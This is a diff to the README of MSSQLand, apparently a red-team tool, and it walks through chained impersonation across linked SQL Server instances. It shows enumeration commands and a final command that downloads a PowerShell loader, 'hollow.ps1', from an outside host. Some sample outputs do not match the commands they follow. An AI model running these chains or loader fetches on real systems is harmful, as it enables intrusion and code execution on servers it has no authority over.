@@ -43,7 +43,7 @@ Create the following output:
 ```
 
 ## Show Time 👑
-The power of this tool is showable in a common use case that you can find in challenges, labs en enterprise-wide environments during your engagments. You gain access to a database `SQL01` as `user1`. Then you need to impersonate `user2` in order to connect to linked database `SQL02`. In `SQL02`, you need to impersonate `user3` in order to go further and so on and so forth.
+The power of this tool is showable in a common use case that you can find in challenges, labs en enterprise-wide environments during your engagments. You gain access to a database `SQL01` mapped to the user `dbo`. You need to impersonate `webapp02` in order to connect to linked database `SQL02`. In `SQL02`, you need to impersonate `webapp03` in order to go further and so on and so forth.
 
 Let's say you’ve landed an agent inside a `sqlservr.exe` process running under the high-privileged `NT AUTHORITY\SYSTEM`. Lucky you! 🎯
 
@@ -66,7 +66,7 @@ EXEC ('EXECUTE AS LOGIN = ''webapp03''; EXEC (''EXECUTE AS LOGIN = ''''webapp04'
 No thanks 🚫. Let MSSQLand handle the heavy lifting so you can focus on the big picture. You've already impersonated multiple users on each hop, and now you want to enumerate links on `SQL04`:
 
 ```shell
-MSSQLand.exe /t:localhost:webapp01 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:links
+MSSQLand.exe /t:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:links
 ```
 
 The output is as follows:
@@ -92,7 +92,7 @@ The output is as follows:
 
 | Last Modified        | Link  | Product    | Provider | Data Source | Local Login | Remote Login | RPC Out | OPENQUERY | Collation |
 | -------------------- | ----- | ---------- | -------- | ----------- | ----------- | ------------ | ------- | --------- | --------- |
-| 7/7/2020 1:02:17 PM  | SQL05 | SQL Server | SQLNCLI  | SQL05       | webapp05    | webadmin     | True    | True      | False     |
+| 7/7/2020 1:02:17 PM  | SQL05 | SQL Server | SQLNCLI  | SQL05       | webapp05    | webapps      | True    | True      | False     |
 
 ====================================
   End at 2025-01-14 21:31:39 UTC
@@ -102,7 +102,7 @@ The output is as follows:
 
 Now you want to verify who you can impersonate at the end of the chain:
 ```shell
-MSSQLand.exe /t:localhost:webapp01 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:impersonate
+MSSQLand.exe /t:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:impersonate
 ```
 The output shows:
 
@@ -116,9 +116,9 @@ The output shows:
 |-> Server Version: 15.00.2000
 |-> Database: master
 |-> Client Connection ID: a6a69aa9-b8cc-4c93-9bc4-c162dc67806f
-[>] Attempting to impersonate user: webapp11
+[>] Attempting to impersonate user: webapp02
 [i] You can impersonate anyone as a sysadmin
-[+] Successfully impersonated user: webapp11
+[+] Successfully impersonated user: webapp02
 [i] Server chain: SQL11 -> SQL27 -> SQL53
 [i] Logged in as webapps
 |-> Mapped to the user guest
@@ -141,7 +141,7 @@ The output shows:
 
 Great! Now you can directly reach out to your loader with:
 ```shell
-MSSQLand.exe /t:localhost:webapp01 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04:Jacquard /a:pwshdl "172.16.118.218/d/g/hollow.ps1"
+MSSQLand.exe /t:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04:Jacquard /a:pwshdl "172.16.118.218/d/g/hollow.ps1"
 ```
 
 And yes, all the outputted tables are Markdown friendly. What a kind gesture!
